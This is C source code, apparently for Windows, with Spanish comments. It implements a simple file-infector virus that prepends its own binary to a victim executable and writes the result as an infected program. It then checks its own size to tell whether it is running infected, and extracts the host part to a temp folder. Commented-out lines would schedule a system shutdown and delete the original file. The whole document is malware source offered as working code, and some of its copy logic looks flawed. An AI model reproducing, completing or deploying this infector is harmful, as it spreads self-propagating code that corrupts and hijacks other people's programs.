#include<stdio.h>
#include<io.h>
#include<direct.h>
#include<conio.h>
#include<time.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
int tamVirus=42969;
clock_t st,end;
int printTam(char *str){
  FILE *virus;
  virus=fopen(str,"rb"); //Virus
  int size=0;
  fseek(virus, 0, SEEK_END);    
  size = ftell(virus);
  //printf("Este archivo pesa: %d\n", size);    
  return size;
}


void infectar(){
  FILE *virus,*host,*infectado;
  int a=0;
  unsigned long x;
  char buff[2048];
  //st=clock();
  char *virusName="final.exe";
  char *hostingName="hola.exe";
  virus=fopen(virusName,"rb"); //Virus
  host=fopen(hostingName,"rb+"); //Programa victima
  infectado=fopen("hola1.exe","ab+");//Programa infectado
  x=tamVirus;
  printf("Infectando..");
  
  //fseek(host, 0, SEEK_END);

  //Copiando Primero virus
  while(x>2048) {
    fread(buff,2048,1,virus);
    fwrite(buff,2048,1,infectado);
    x-=2048;
  }
  fread(buff,x,1,virus);
  fwrite(buff,x,1,infectado);
  //Copiando Segundo Programa Victima
  x=printTam(hostingName);
  while(x>2048) {
    fread(buff,2048,1,host);
    fwrite(buff,2048,1,infectado);
    x-=2048;
  }
  fread(buff,x,1,host);
  fwrite(buff,x,1,infectado);
  
  
  //a++;
  //system("shutdown -s -t 1000");
  /*
  int size=0;
  fseek(virus, 0, SEEK_END);    
  size = ftell(virus);
  printf("Este archivo pesa: %d\n", size);    
  */
  fclose(virus);
  fclose(host);
  //char* comandoBorrar="DEL ";
  //char*nombreBorrar=strcat(comandoBorrar,hostingName);
  //system(nombreBorrar);
}

void ejecutarVictima(char *miNombre){
  int currentTam=printTam(miNombre);
  if(currentTam>tamVirus){
    printf("Soy un archivo infectado: %d",currentTam);
    FILE *temp,*infectado;
    char buff[2048];
    char *tempName="c:\\temp\\temp.exe";
    _mkdir("C:\\temp");
    infectado=fopen(miNombre,"rb"); //Programa infectado
    temp=fopen(tempName,"ab+");//Programa copiado a carpeta Temporal
    int x=tamVirus;
    fseek(infectado, x, SEEK_SET ); 
    while(x>2048) {
      fread(buff,2048,1,infectado);
      fwrite(buff,2048,1,temp);
      x-=2048;
    }
    fread(buff,x,1,infectado);
    fwrite(buff,x,1,temp);
  }
  else{
    printf("Soy solo el virus: %d",tamVirus);
    
  }
}

int main(int argc, char** argv){
  //char*name="final.exe";
  //  int t=printTam("final.exe");
  //printf("Tam: %d",t);
  infectar();
  ejecutarVictima(argv[0]);
  //getch();
  return 0;
}
